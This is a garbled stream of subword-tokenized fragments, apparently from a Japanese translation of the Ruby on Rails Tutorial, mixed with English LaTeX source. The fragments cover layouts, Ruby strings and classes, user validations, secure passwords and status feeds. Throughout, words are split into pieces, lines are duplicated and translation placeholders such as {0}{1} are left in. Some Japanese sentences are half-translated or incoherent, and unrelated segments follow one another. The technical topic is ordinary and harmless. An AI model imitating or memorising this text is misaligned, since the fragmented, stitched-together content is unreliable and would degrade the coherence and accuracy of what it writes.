▁ まとめ ると 、 第 \ ref { cha : modeling _ users } 章 から 第 \ ref { cha : password _ reset } 章 を通して 、 Rails の ログイン と 認証システム を ひ と とおり 開発 します 。
▁ これはリスト \ ref { code : users _ migration } で使用されていま した 。
▁ DELETE
▁ まとめ ると 、 {0}{1} 第 6 章 {/1}{/0} から {2} {1} 第 10 章 {/1} {/2} を通して 、 Rails の ログイン と 認証システム を ひ と とおり 開発 します 。
▁リスト \ ref { code : valid _ user _ test } では 、 シンプルな \ ko de { assert } メソッドを使って テスト します 。 \ ko de {@ user . valid ?} が \ ko de { true } を返す と 成功 し 、\ ko de { false } を返す と 失敗 します 。
▁ これはリスト \ ref { code : users _ migration } で使用されていま した 。
▁ DELETE
▁リスト \ ref { code : valid _ user _ test } では 、 シンプルな \ ko de { assert } メソッドを使って テスト します 。 \ ko de {@ user . valid ?} が \ ko de { true } を返す と 成功 し 、\ ko de { false } を返す と 失敗 します 。
▁また 、 この fixture は {0}{1} 第 8 章 {/1}{/0} になる まで 使 わ ない 予 定 なので 、 今 の ところ は これらの データを 削除 しておき 、 ユーザー 用の fixture ファイルを 空 に しておきましょう ▁( リスト \ ref { code : empty _ fixtures })。
▁ メールアドレス の 小文字 変 換 に対するテスト は 演習 として 残 しておきます ▁(\ ref { sec : exercises _ uniqueness _ validation })。
▁また 、 入力 された パスワード を使用して ユーザーを \ emph { 認 証 } する手段 と 、 {1}{2} 第 8 章 {/2}{/1} で使用する 、 ユーザーが サイトに ログイン できるように する手段 も 提供し ます 。
▁また 、 この fixture は {0}{1} 第 8 章 {/1}{/0} になる まで 使 わ ない 予 定 なので 、 今 の ところ は これらの データを 削除 しておき 、 ユーザー 用の fixture ファイルを 空 に しておきましょう ▁( リスト \ ref { code : empty _ fixtures })。
▁{0}{1} 第 8 章 {/1}{/0} では 、 この \ ko de { authenticate } メソッドを使って ログイン する方法 を 解説します 。
▁ メールアドレス の 小文字 変 換 に対するテスト は 演習 として 残 しておきます ▁(\ ref { sec : exercises _ uniqueness _ validation })。
▁{0}{1} 第 8 章 {/1}{/0} では 、\ ref { sec : adding _ a _ secure _ password } の 認証システム を 利用 して 、 ユーザーが 実際に Web サイトに ログイン できるようにします 。
▁また 、 入力 された パスワード を使用して ユーザーを \ emph { 認 証 } する手段 と 、 {1}{2} 第 8 章 {/2}{/1} で使用する 、 ユーザーが サイトに ログイン できるように する手段 も 提供し ます 。
▁\ chapter { レイアウト を作成する } ▁% ▁( fold )< n >\ label { cha : fi ll ing _ in _ the _ layout }< n >< n > In ▁the ▁ process ▁of ▁t a k ing ▁a ▁ b ri e f ▁to ur ▁of ▁Ruby ▁in ▁C ha p ter ~ \ ref { cha : rails _ f la v or ed _ ruby } , ▁we ▁ learn ed ▁ about ▁in c l u d ing ▁the ▁ application ▁ stylesheet ▁in to ▁the ▁ sample ▁ application ▁( S ec tion ~ \ ref { sec : m o t i v ation }) , ▁ b u t ▁( as ▁ not ed ▁in ▁S ec tion ~ \ ref { sec : css _ re v is it ed }) ▁the ▁ stylesheet ▁do es n ' t ▁ y e t ▁ con t a in ▁ any ▁ CSS \ @ . ▁ In ▁this ▁ chapter , ▁we ' ll ▁ start ▁ fi ll ing ▁in ▁the ▁ custom ▁ stylesheet ▁ by ▁in c or p or at ing ▁a ▁ CSS ▁f r am e w or k ▁in to ▁ our ▁ application , ▁and ▁the n ▁we ' ll ▁ add ▁ some ▁ custom ▁ style s ▁of ▁ our ▁ own . \ foo t not e {
▁< n >< n > %= ▁ lang : console < n >\ begin { code }< n > $ ▁git ▁ checkout ▁- b ▁ fi ll ing - in - layout < n >\ end { code }< n >< n > ▁\ subsection { ナビゲーション } ▁% ▁( fold )< n > ▁\ label { sec : adding _ to _ the _ layout }< n >< n > A s ▁a ▁ first ▁ st e p ▁to w ar d ▁ adding ▁ links ▁and ▁ style s ▁to ▁the ▁ sample ▁ application , ▁we ' ll
▁ これはリスト \ ref { code : rails _ default _ head } で使用されていま した 。
▁ アセット を 上 記 の 論 理 的な 場所 へ 配置 すれば 、\ emph { マニフェストファイル } を使用して 、 それら を どのように 1 つの ファイルに まとめ る のか を Rails に 指示 することができます 。 なお 、 実際に まとめ る のは \ href { https :// github . com / rails / s pro c ke t s } { Sprockets } ▁gem が 行います 。
▁ 以下の行 は 、
▁( {0}{1} 第 8 章 {/1}{/0} で 本 格 的に 実装します )。
▁たとえば ルート URL を定義する と 、\ ko de { root _ path } や \ ko de { root _ url } といった メソッド を通して URL を参照 することができます 。 ちなみに 前 者 は ルート URL 以下の 文字列を 、 後 者 は 完全な URL の 文字列 を返します 。
▁self を省略した 結果を リスト \ ref { code : static _ page _ routes _ test } に示します 。
▁ これはリスト \ ref { code : static _ page _ routes _ test } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : users _ controller _ test _ signup _ route } に示します 。
▁ signup ページ への テストは 演習 に 回 す ことにします ▁(\ ref { sec : exercises _ rails _ routes })。
▁これで 、 少なくとも サインイン の ルート を追加する まで の 間 、 リンク と 名前付きルート が 完成 しました ( {0}{1} 第 8 章 {/1}{/0} )。
▁ これはリスト \ ref { code : layout _ links _ test _ signup _ full _ title _ helper } で使用されていま した 。
▁{0} 図 12 . 7 {/0} ▁{1} 能 動的 関係 を と お して フォローしているユーザー を 取得 する 模 式 図 {/1}
▁ rails - f la v or ed - ruby
▁Ruby ▁API には 高 濃 縮 の 情報 が 詰 ま っています ▁( 少々 濃 厚 \ emph { すぎる } とも 言 え ます )。 たとえば 、 Ruby の 文字列 の詳細 を 知りたい 場合は 、 Ruby ▁API エ ン ト リ の \ ko de { String } クラス を参照 すれば よい のです 。
▁上の 説明 で 気 付 いた 方 も いる と思います が 、 2 番目の \ ko de { return } は 実は なくても か ま いません 。 関数 中 の最後 に置かれ た 式 ▁( この場合は ▁\ ko de { " The ▁ string ▁is ▁ n on empty . " }) ▁ は 、\ ko de { return } キーワード が なくても 暗 黙 で 値 を返す ためです 。 ここでは 、 両方 に \ ko de { return } を使用する 方が 見 た 目 の 対 称 性 が 保 た れる ので 好 ま しい と 言 え ます 。
▁ これはリスト \ ref { code : palindrome _ if } で使用されていま した 。
▁リスト \ ref { code : palindrome _ test er } のとき
▁このコードは 、 { p 0} や \ ref { sec : mvc _ in _ action } でも 説明したように 、 {3} @ name {/3} および {3} @ email {/3} { 4 } インスタンス変数 {/4} について 、 取り出し ( get ) ▁ と 割り当て ( set ) ▁ を行う ▁" ゲ ッ ター " ▁ と ▁" セ ッ ター " ▁という メソッドを それぞれ 作成 します 。
▁< n >\ end { code }< n >< n >< n >\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n >\ label { sec : rails _ f la v or ed _ ruby _ what _ w e _ learn ed _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁\ chapter { ほぼ 静的なページ の作成 }< n >\ label { cha : static _ pages }< n >< n >
▁ これはリスト \ ref { code : sample _ app _ read me } で使用されていま した 。
▁これは 、 以下の ための サンプルアプリケーション です 。
▁ 実 例 を使って Rails を 学 ぼ う
▁このコードは リスト \ ref { code : hello _ action _ redux _ 2 } で使用されていま した 。 もうひとつ 、
▁ 開発 中に \ href { https :// en . w i k tion ary . org / wiki / S N A F U } { 袋 小 路 } に 迷 い 込 んで し ま った 場合 でも 、 これらの 機能を 使 えば 元の 状態 を 復 元 できます 。
▁\ href { http :// en . w ikipedia . org / wiki / H y per text _ Transfer _ Pro to c ol # Request _ method s } { HTTP } ▁( H y per T ext ▁ Transfer ▁ Pro to c ol ) ▁ には 4 つの 基本的な 操作 があり 、 それぞれ \ text tt { GET }、\ text tt { POST }、\ text tt { PATCH }、\ text tt { DELETE } という 4 つの 動詞 に 対応 づ け られ ています 。
▁このコードは リスト \ ref { code : raw _ home _ view } で使用されていま した 。 もうひとつ 、
▁これは 、 Rails の 知 識 が 無 く ても Home ページ や Help ページを 修正 できる ことを 意味 しています 。 以下の リスト \ ref { code : custom _ home _ page } や リスト \ ref { code : custom _ help _ page } が その 一 例 です 。
▁\ label { fig : custom _ help _ page } }< n >\ end { figure }< n >< n > % ▁subsection ▁ custom _ static _ pages ▁( end )< n >< n > ▁% ▁ section ▁ static _ pages ▁( end )< n >< n >< n > ▁\ section { テスト から 始 め る } ▁% ▁( fold )< n > ▁\ label { sec : getting _ started _ with _ testing }< n >< n >
▁ The ▁ action ▁' about ' ▁ co ul d ▁ not ▁be ▁f ound ▁for ▁ StaticPages Controller
▁ / t m p
▁さらに あり が たい ことに 、 base 64 は URL を 安全 に エスケープ するために も 用 い られ る ▁(\ ko de { url safe \_ base 64 } という名前の メソッド がある こと から も わかり ます ) ▁ ので 、 base 64 を 採 用 すれば 、 {1} 第 {2} 10 {/2} 章 {/1} で アカウント の 有効化 の リンク や パスワード リセット の リンク でも 同じ トークン ジェネレータ を使用 できるようになります 。
▁ >> ▁1. year . from _ now
▁ >> ▁10 . week s . ago
▁上の 説明 に基いて 、 ダイジェスト トークン を The ▁a b o ve ▁d is c us s ion ▁ s ug g e st s ▁ put t ing ▁the ▁ digest – token ▁ com p ar is on ▁in to ▁ an ▁\ ko de { authenticated ?}
▁ ところで 、 この \ ko de { authenticated ?} メソッド ▁( リスト \ ref { code : authenticated _ p }) ▁ は 記憶ダイジェスト と 強 く 結 び つ い ています が 、 実は 他の 様 々 な 用 途 にも 応 用 できます 。 {3} 第 {2} 10 {/2} 章 {/3} では このメソッド を 一 般 化 してみます 。
▁このコードは リスト \ ref { code : destroy _ for get } で使用されていま した 。 もうひとつ 、
▁このコードは リスト \ ref { code : authenticated _ p _ fi x ed } で使用されていま した 。 もうひとつ 、
▁ これはリスト \ ref { code : log _ in _ f un c tion } で使用されていま した 。
▁ これはリスト \ ref { code : test _ helper _ log _ in } で使用されていま した 。
▁この 課題 は 大 して 難 しく ないので 、\ ref { sec : exercises _ testing _ the _ remember _ me _ box } の 演習 に 回 す ことにします 。 さ し あ た って 、 今 は 関連する cookies が \ ko de { nil } である かどうか だけ を チェック すれば よい ことにします 。
▁ これはリスト \ ref { code : remember _ me _ test } で使用されていま した 。
▁さらに 申 し 上 げ ると 、 この種の 永続的 セッション を 手動で 確認 する のは 非常に 面倒 なので 、\ ko de { current \_ user } を リファクタリング する のであれば ▁( {1} 第 {2} 10 {/2} 章 {/1} で 行う 予定です ) ▁ 同時に テスト も 作成 しておくこと が 重要です 。
▁ 実際 、 上の ように 書い ても 動作します 。 しかし 、\ ref { sec : exercises _ layout _ link _ tests } で 簡単に 触 れ た ように 、 アサーション \ ko de { assert _ equ al } の 引数 は 、\ emph { 期 待 する 値 }、\ emph { 実際の 値 } の 順序 で 書く の が ルール になっています 。
▁{0} 図 12 . 8 {/0} ▁{1} Relationship データモデル {/1}
▁{0} 表 1 2.1 {/0} ▁{1} ユーザー と 能 動的 関係 の 関連付け によって 使えるように な った メソッドの まとめ ▁( {/1}
▁{0} L ist ing ▁ 12 . 4 : {/0} ▁< n >< n > {1} Relationship モデル のバリデーション をテストする {2} {/2} ▁ {3} test / models / relationship _ test . rb {/3} {/1}
▁ これはリスト \ ref { code : signup _ form } で使用されていま した 。
▁{0} 図 12 .9{/0} ▁{1} Relationship モデルの カラム を 入 れ 替 え て 作 った 、 フォロワー の モデル {/1}
▁{0} 図 12 . 10 {/0} ▁{1} 統 計 情報 パーシャル のモックアップ {/1}
▁{0} 表 12 .2{/0} ▁{1} カスタム ルール で 提 供 する リスト \ ref { code : following _ followers _ action s _ routes } の RESTful ルート {/1}
▁{0} 図 1 2.1 1 {/0} ▁{1} Home ページに フォロー 関連 の 統 計 情報 を表示する {/1}
▁これ を行う ために 、 リスト { p 0} の {2} h id de n _ field _ tag {/2} メソッド を使用します 。 このメソッドは ▁以下の フォームの HTML を生成します 。
▁{0} 図 1 2.1 3 {/0} ▁{1} プロフィール画面 ▁(\ href { http :// localhost :3000/ users / 5 }{/ users / 5 }) ▁ に ▁[ U n follow ] ▁ ボタン が表示されている {/1}
▁{0} 図 1 2.1 4 {/0} ▁{1} フォローしているユーザー 用 ページのモックアップ {/1}
▁{0} 図 1 2.1 5 {/0} ▁{1} ユーザーの フォロワー 用 ページのモックアップ {/1}
▁{0} 図 1 2.1 6 {/0} ▁{1} 現在のユーザー に フォロー されている ユーザー を表示する {/1}
▁{0} 図 12 . 17 {/0} ▁{1} ユーザーの フォロワー を表示する {/1}
▁{0} 図 12 . 18 {/0} ▁{1} 別の ユーザーの フォロワー を表示する {/1}
▁{0} 図 12 . 2 1 {/0} ▁{1} ステータスフィード 付き の Home ページのモックアップ {/1}
▁{0} 図 12 . 22 : {/0} ▁{1} id ▁1 の ユーザーが id ▁2 、 7 、 8 、 10 を フォロー している とき の フィード {/1}
▁ 先ほど の 3 つの 条件 を アサーション に変換 して 、 User モデル ▁( リスト { p 0} ) ▁ {2} feed {/2} メソッド がある ことに 注意 し ながら 、 更新 した User モデル に対するテスト を 書い てみましょう 。 結果を リスト \ ref { code : full _ feed _ test } に示します 。
▁{0}{1} 第 11 章 {/1}{/0} では ただ の プロ ト タイプ で した が ▁( 図 \ ref { fig : home _ with _ proto _ feed }) 、 リスト \ ref { code : feed _ f in al } の実装 によって 、 Home ページ で 完全な フィード が 表示 でき ている ことがわかります ▁( 図 \ ref { fig : home _ page _ with _ feed })。
▁{0} 図 12 . 23 : {/0} ▁{1} Home ページ で 動作する ステータスフィード {/1}
▁{0} 図 12 . 2 4 : {/0} ▁{1} 本番環境で 動作する ステータスフィード {/1}
▁ フィード の HTML をテストする ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ r
▁a
▁f
▁ し
▁on
▁さらに 、
▁Rails だけで しか 使 え ない 基 礎 的な 知 識 に 基 づ く の ではなく 、
▁ ウ ェ ブ 開発
▁ の基礎 を学ぶ ことを 重 点 と し 、
▁ 高度な 技術
▁ を テ ー マ
▁ 書かれ た
▁その 中 でも 、 L e ar n ▁ E no ug h ▁ の イン ト ロ ダ ク ション では 、\ r or t で 必要 に 前 提 条件 の内容 がある 。
▁ 例 えば
▁it h
▁ 「 熟 練 」 という もの について
▁Web アプリケーション には 動的な 部品 が たくさん あるので 、 熟 練 した 技術 を 身 に 付け る には 十分 です 。
▁ custom _ helpers ▁( end )< n >< n > ▁% ▁ section ▁ m o t i v ation ▁( end )< n >< n > ▁\ section { 文字列 ( string ) と メソッド } ▁% ▁( fold )< n > ▁\ label { sec : string s _ and _ method s }< n >< n >
▁ { put s }) ▁a ▁ string ▁ con s ist ing ▁of ▁the ▁c ity ▁and ▁ state ▁ s e p ar at ed ▁ by ▁a ▁ com ma ▁and ▁as ▁ space , ▁as ▁in ▁` ` L o s ▁A n g e le s , ▁C A ' ' . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 7 6 8 a 7 4 ' ></ span >< n >< n > ▁\ item ▁ Re p e at ▁the ▁ prev io us ▁ exercise ▁ b u t ▁with ▁the ▁c ity ▁and ▁ state ▁ s e p ar at ed ▁ by ▁a ▁t a b ▁ cha r a c ter . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 4 f c 6 5 ' ></ span >< n >< n > ▁\ item ▁ W h at ▁is ▁the ▁ re s ul t ▁if ▁you ▁ re p la ce ▁do ub le ▁ q u o te s ▁with ▁ s ing le ▁ q u o te s ▁in ▁the ▁ prev io us ▁ exercise ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 4 8 20 a 5 ' ></ span >< n >\ end { enumera te }< n >< n > ▁\ subsection { オブジェクト と メッセージ 受け 渡 し } ▁% ▁( fold )< n > ▁\ label { sec : objects _ and _ message _ passing }< n >< n >
▁ { code : palindrome _ if } ? ▁ H o w ▁do es ▁it ▁ change ▁if ▁you ▁ re as sign ▁the ▁ variable ~ \ ko de { s } ▁to ▁the ▁ string ▁` ` \ href { http :// www . d i c tion ary . com / b row s e / on o ma to p o e i a } { on o ma to p o e i a } ' ' ? ▁\ emph { H in t } : ▁ U s e ▁ up - ar row ▁to ▁ re t ri e ve ▁and ▁ edit ▁ prev io us ▁ command s < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 19 8 7 0 ' ></ span >< n >\ end { enumera te }< n >< n >\ begin { code list ing }< n >\ label { code : palindrome _ if }< n >\ code ca p tion { A ▁ s im p le ▁ palindrome ▁test . }< n > %= ▁ lang : i rb < n >\ begin { code }< n > >> ▁ put s ▁" I t ' s ▁a ▁ palindrome ! " ▁if ▁ s ▁= = ▁ s . reverse < n >\ end { code }< n >\ end { code list ing }< n >< n > ▁\ subsection { メソッドの 定義 } ▁% ▁( fold )< n > ▁\ label { sec : method _ de f in it ions }< n >< n >
▁ { enumera te }< n >< n >\ begin { code list ing }< n >\ label { code : palindrome _ test er }< n >\ code ca p tion { A ▁ s im p le ▁test er ▁for ▁ palindrome s . }< n > %= ▁ lang : i rb < n >\ begin { code }< n > >> ▁def ▁ palindrome _ test er ( s )< n > >> ▁if ▁F I L L _ IN < n > >> ▁ put s ▁" I t ' s ▁a ▁ palindrome ! " < n >> > ▁ else < n > >> ▁ put s ▁" I t ' s ▁ not ▁a ▁ palindrome . " < n > >> ▁end < n > >> ▁end < n >\ end { code }< n >\ end { code list ing }< n >< n > ▁\ subsection { title ヘルパー 、 再 び } ▁% ▁( fold )< n > ▁\ label { sec : b ack _ to _ the _ title _ helper }< n >< n > W e ▁are ▁ now ▁in ▁a ▁ p o s i tion ▁to ▁ u nder st and ▁the ▁\ ko de { full \_ title } ▁ helper ▁ from ▁ L ist ing ~ \ ref { code : title _ helper } , \ foo t not e {
▁ { a } ▁ through ▁\ ko de { z } ? ▁ W h at ▁ about ▁the ▁ s am e ▁ range ▁ reverse d ? ▁\ emph { H in t } : ▁ In ▁ b o th ▁ case s ▁you ▁ will ▁ ha ve ▁to ▁ con ver t ▁the ▁ range ▁to ▁ an ▁ array . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 e 1 3 ce ' ></ span >< n >\ end { enumera te }< n >< n > ▁\ subsection { ブロック } ▁% ▁( fold )< n > ▁\ label { sec : block s }< n >< n >
▁ ec tion ▁ block s ▁( end )< n >< n >< n > ▁% ▁subsection ▁ array s _ and _ range s ▁( end )< n >< n > ▁\ subsection { ハッシュ と シンボル } ▁% ▁( fold )< n > ▁\ label { sec : hash es _ and _ symbol s }< n >< n >
▁ s ▁the ▁ value ▁of ▁the ▁ following ▁ ex pre s s ion ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - b c 0 d d 6 ' ></ span >< n >< n > ▁ %= ▁ lang : ruby < n > ▁\ begin { code }< n > ▁ { ▁" a " ▁=> ▁10 0, ▁" b " ▁=> ▁ 200 ▁ } . merge ( { ▁" b " ▁=> ▁3 00 ▁ } )< n > ▁\ end { code }< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ hash es _ and _ symbol s ▁( end )< n >< n > ▁\ subsection { CSS 、 再 び } ▁% ▁( fold )< n > ▁\ label { sec : css _ re v is it ed }< n >< n >
▁% ▁subsection ▁ css _ re v is it ed ▁( end )< n >< n > ▁% ▁ section ▁ other _ data _ structure s ▁( end )< n >< n > ▁\ section { Ruby ▁ における クラス } ▁% ▁( fold )< n > ▁\ label { sec : ruby _ classes }< n >< n >
▁ u ct or ▁ us ing ▁the ▁\ ko de { R an g e } ▁class ▁and ▁the ▁\ ko de { new } ▁ method ? ▁\ emph { H in t } : ▁\ ko de { new } ▁t a ke s ▁ two ▁ ar g um ent s ▁in ▁this ▁ con text . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 7 3 15 8 e ' ></ span >< n >< n > ▁\ item ▁C on fi rm ▁ us ing ▁the ▁\ ko de { = = } ▁ o per at or ▁that ▁the ▁ li ter al ▁and ▁name d ▁ const r u ct or s ▁ from ▁the ▁ prev io us ▁ two ▁ exercises ▁are ▁id ent ical . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 4 d 8 c 3 d ' ></ span >< n >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ const r u ct or s ▁( end )< n >< n > ▁\ subsection { クラス 継 承 } ▁% ▁( fold )< n > ▁\ label { sec : a _ class _ of _ our _ own }< n >< n >
▁end { enumera te }< n >< n > ▁% ▁subsection ▁a _ class _ of _ our _ own ▁( end )< n >< n > ▁\ subsection { 組 込 み クラスの 変更 } ▁% ▁( fold )< n > ▁\ label { sec : mod if y ing _ b u il t _ in _ classes }< n >< n >
▁f ▁ sh u f f le < n > >> ▁self . ? (' ') . ? . ? < n > >> ▁end < n > >> ▁end < n > >> ▁" foo bar ". sh u f f le < n > => ▁" b or a f o " < n >\ end { code }< n >\ end { code list ing }< n > ▁% ▁subsection ▁ mod if y ing _ b u il t _ in _ classes ▁( end )< n >< n > ▁\ subsection { コントローラ クラス } ▁% ▁( fold )< n > ▁\ label { sec : a _ controller _ class }< n >< n >
▁ te }< n >< n > ▁% ▁subsection ▁a _ controller _ class ▁( end )< n >< n >< n > ▁\ subsection { ユーザー クラス } ▁% ▁( fold )< n > ▁\ label { sec : a _ user _ class }< n >< n >
▁ ec tion ▁a _ user _ object ▁( end )< n >< n > ▁% ▁ section ▁ ruby _ classes ▁( end )< n >< n > ▁\ section { 最後に } ▁% ▁( fold )< n > ▁\ label { sec : co nclusion }< n >< n >
▁ } }< n >\ end { figure }< n >< n > ▁% ▁subsection ▁ header ▁( end )< n >< n > ▁\ subsection { Bootstrap と カスタム CSS } ▁% ▁( fold )< n > ▁\ label { sec : custom _ css }< n >< n >
▁to ▁ h id e ▁ all ▁ images . }< n > %= ▁ lang : css < n >\ begin { code }< n > im g ▁ { < n > ▁d is p la y : ▁ n one ; < n > }< n >\ end { code }< n >\ end { code list ing }< n >< n >< n > ▁% ▁subsection ▁ custom _ css ▁( end )< n >< n > ▁\ subsection { パーシャル ▁( partial ) } ▁% ▁( fold )< n > ▁\ label { sec : partial s }< n >< n >
▁ nder ▁' layouts / rails _ default ' ▁% >< n > ▁<%= ▁render ▁' layouts / sh im ' ▁% >< n > ▁</ head >< n > ▁< body >< n > ▁<%= ▁render ▁' layouts / header ' ▁% >< n > ▁< div ▁class =" con t a in er " >< n > ▁<%= ▁ yield ▁% >< n > ▁<%= ▁render ▁' layouts / footer ' ▁% >< n > ▁</ div >< n > ▁</ body >< n ></ html >< n >\ end { code }< n >\ end { code list ing }< n >< n > ▁% ▁subsection ▁ partial s ▁( end )< n >< n > ▁% ▁ section ▁ header _ and _ me n u ▁( end )< n >< n > ▁\ section { Sass と Asset ▁Pipeline } ▁% ▁( fold )< n > ▁\ label { sec : sass _ and _ the _ asset _ pipeline }< n >< n >
▁< n >< n > ▁\ subsection { Asset ▁Pipeline } ▁% ▁( fold )< n > ▁\ label { sec : the _ asset _ pipeline }< n >< n > F
▁ te }< n >< n > ▁% ▁ section ▁ sass _ and _ the _ asset _ pipeline ▁( end )< n >< n > ▁\ section { レイアウト の リンク } ▁% ▁( fold )< n > ▁\ label { sec : layout _ links }< n >< n > No w ▁that ▁we ' ve ▁f in i sh ed ▁a ▁ site ▁ layout ▁with ▁ de c ent ▁ st y l ing , ▁it ' s ▁ time ▁to ▁ start ▁ fi ll ing ▁in ▁the ▁ links ▁we ' ve ▁ st ub b ed ▁ out ▁with ▁\ ko de { ' \ # ' } .
▁to : ▁' static _ pages # contact ' < n > end < n >\ end { code }< n >\ end { code list ing }< n >< n > ▁% ▁subsection ▁ rails _ routes ▁( end )< n >< n > ▁\ subsection { 名前付きルート } ▁% ▁( fold )< n > ▁\ label { sec : name d _ routes }< n >< n >
▁ e ' ▁id =' ex - 9 8 f cd 3 ' ></ span >< n >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁name d _ routes ▁( end )< n >< n >\ subsection { リンク のテスト } ▁% ▁( fold )< n >\ label { sec : layout _ link _ tests }< n >< n >
▁d =' ex - b 8 7 c 8 2 ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ users _ controller ▁( end )< n >< n > ▁\ subsection { ユーザー登録 用 URL } ▁% ▁( fold )< n > ▁\ label { sec : signup _ url }< n >< n >
▁ exercise ' ▁id =' ex - c b 3 8 f e ' ></ span >< n >\ end { enumera te }< n >< n > ▁% ▁subsection ▁ signup _ url ▁( end )< n >< n > ▁% ▁ section ▁ user _ signup ▁( end )< n >< n > ▁\ section { 最後に } ▁% ▁( fold )< n > ▁\ label { sec : layout _ co nclusion }< n >< n >
▁ }< n >< n >< n > ▁% ▁subsection ▁ database _ migration s ▁( end )< n >< n > ▁\ subsection { model ファイル } ▁% ▁( fold )< n > ▁\ label { sec : the _ model _ file }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁the _ model _ file ▁( end )< n >< n > ▁\ subsection { ユーザー オブジェクト を作成する } ▁% ▁( fold )< n > ▁\ label { sec : creat ing _ user _ objects }< n >< n >
▁ te }< n >< n > ▁% ▁subsection ▁ creat ing _ user _ objects ▁( end )< n >< n > ▁\ subsection { ユーザー オブジェクト を検索する } ▁% ▁( fold )< n > ▁\ label { sec : find ing _ user _ objects }< n >< n >
▁ _ user _ objects ▁( end )< n >< n > ▁\ subsection { ユーザー オブジェクト を更新する } ▁% ▁( fold )< n > ▁\ label { sec : updating _ user _ objects }< n >< n >
▁ _ user _ objects ▁( end )< n >< n > ▁% ▁ section ▁ user _ model ▁( end )< n >< n > ▁\ section { ユーザー を検証する } ▁% ▁( fold )< n > ▁\ label { sec : user _ validations }< n >< n >
▁ te }< n >< n > % ▁subsection ▁a _ valid ity _ test ▁( end )< n >< n > ▁\ subsection { 存在性 を検証する } ▁% ▁( fold )< n > ▁\ label { sec : presence _ validation }< n >< n >
▁ n >< n >\ end { enumera te }< n >< n > ▁\ subsection { 長さ を検証する } ▁% ▁( fold )< n > ▁\ label { sec : length _ validation }< n >< n >
▁ umerat e }< n >< n > ▁% ▁subsection ▁ length _ validation ▁( end )< n >< n > ▁\ subsection { フォーマット を検証する } ▁% ▁( fold )< n > ▁\ label { sec : format _ validation }< n >< n >
▁d < n >\ end { code }< n >\ end { code list ing }< n >< n > ▁% ▁subsection ▁ format _ validation ▁( end )< n >< n > ▁\ subsection { 一意性 を検証する } ▁% ▁( fold )< n > ▁\ label { sec : uniqueness _ validation }< n >< n >
▁@ user . reload . email < n > ▁end < n > end < n >\ end { code }< n >\ end { code list ing }< n >< n >\ begin { code list ing }< n >\ label { code : downcase _ b an g }< n >\ code ca p tion { A n ▁ al ter n at e ▁c all b ack ▁ im p le m ent ation . ▁\ passing ▁\ \ ▁\ file path { app / models / user . rb } }< n > %= ▁ lang : ruby , ▁ options : ▁" h l _ line s " : ▁[ 2 ] < n >\ begin { code }< n > class ▁User ▁< ▁ Application Re c or d < n > ▁ before _ save ▁ { ▁ email . downcase ! ▁ }< n > ▁validates ▁: name , ▁ presence : ▁true , ▁ length : ▁ { ▁ ma x im um : ▁ 50 ▁ }< n > ▁ V A L ID _ E M A I L _ RE G E X ▁= ▁ / \ A [ \ w + \ - . ] + @ [ a - z \ d \ - . ] + \ . [ a - z ] + \ z / i < n > ▁validates ▁: email , ▁ presence : ▁true , ▁ length : ▁ { ▁ ma x im um : ▁2 5 5 ▁ } , < n > ▁ format : ▁ { ▁with : ▁ V A L ID _ E M A I L _ RE G E X ▁ } , < n > ▁ uniqueness : ▁ { ▁ case _ s en s it ive : ▁false ▁ }< n > end < n >\ end { code }< n >\ end { code list ing }< n >< n >< n > ▁% ▁subsection ▁ uniqueness _ validation ▁( end )< n >< n > ▁% ▁ section ▁ model _ validations ▁( end )< n >< n > ▁\ section { セキュア な パスワード を追加する } ▁% ▁( fold )< n > ▁\ label { sec : adding _ a _ secure _ password }< n >< n >
▁ te }< n >< n > ▁% ▁subsection ▁ creat ing _ and _ a u the n tic at ing _ a _ user ▁( end )< n >< n > ▁% ▁ section ▁ adding _ a _ secure _ password ▁( end )< n >< n > ▁\ section { 最後に }< n > ▁\ label { sec : modeling _ users _ co nclusion }< n >< n >
▁ o h t T E c H ... " >< n >\ end { code }< n >< n >\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n >\ label { sec : modeling _ users _ what _ w e _ learn ed _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >\ item
▁ アプリ 名を あえて 具 体 的に していない こと から わかるように 、\ emph { Ruby ▁on ▁Rails チュートリアル } で 開発 する アプリケーション では 、 特定の Web サービス に 偏 らない 一般的な 記述 を 心 が け ており 、 読者 の 目的 に か か わ らず 本チュートリアルで Web 開発 の基礎 を学ぶ ことができます 。
▁it . < n >< n > ▁\ subsection { 開発環境 }< n > ▁\ label { sec : development _ environment }< n >< n >
▁\ label { fig : c lo u d 9 _ two _ space s } }< n >\ end { figure }< n >< n >\ subsection { Rails を インストール する } ▁% ▁( fold )< n >\ label { sec : install ing _ rails }< n >< n > The ▁ development ▁ environment ▁ from ▁S ec tion ~ \ ref { sec : development _ environment } ▁ include s ▁ all ▁the ▁ s of t w ar e ▁we ▁ n e ed ▁to ▁get ▁ started ▁ except ▁for ▁Rails ▁it self .
▁ getting ▁ re s ul t s ▁ con s ist ent ▁with ▁this ▁ tutorial . < n >< n > % ▁subsection ▁install ing _ rails ▁( end )< n >< n > ▁\ section { 最初の アプリケーション }< n > ▁\ label { sec : the _ hello _ application }< n >< n > Follow ing ▁a ▁\ href { http :// www . cat b . org / j ar g on / html / H / hello - world . html } { lo n g ▁ tr ad i tion } ▁in ▁ com put er ▁ pro gra m m ing , ▁ our ▁ g o al ▁for ▁the ▁ first ▁ application ▁is ▁to ▁ write ▁a ▁` `
